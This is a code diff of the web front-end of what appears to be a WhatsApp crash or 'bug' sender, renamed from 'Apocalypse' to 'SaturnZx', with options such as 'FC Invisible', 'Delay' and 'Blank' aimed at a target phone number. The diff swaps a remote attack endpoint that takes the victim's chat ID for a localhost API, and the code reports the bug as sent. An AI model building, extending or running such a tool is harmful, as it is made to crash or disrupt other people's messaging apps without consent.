@@ -166,16 +166,16 @@
       <span class="status"><i class="fas fa-circle"></i> Connected</span>
     </div>
   </div>
-  <h1 class="neon"><i class="fab fa-whatsapp"></i> Apocalypse</h1>
+  <h1 class="neon"><i class="fab fa-whatsapp"></i> SaturnZx</h1>
   <input type="text" id="target" placeholder="628xxxx" />
 <div class="bug-options">
   <div class="bug-card active" data-bug="crashtotal">
     <i class="fas fa-skull-crossbones"></i><span>FC Invisible</span>
   </div>
-  <div class="bug-card" data-bug="ForClose">
+  <div class="bug-card" data-bug="ApiDellay">
     <i class="fas fa-bomb"></i><span>kontol WA</span>
   </div>
-  <div class="bug-card" data-bug="Delay">
+  <div class="bug-card" data-bug="ApiDellay">
     <i class="fas fa-clock"></i><span>bangke Delay</span>
   </div>
   <div class="bug-card" data-bug="Blank">
@@ -307,7 +307,7 @@ async function sendBug() {
   resDiv.innerText = "";
 
 try {
-  const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
+  const res = await fetch(`https://localhost:5036/api/${selectedBug}`);
   const json = await res.json();
 
   showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
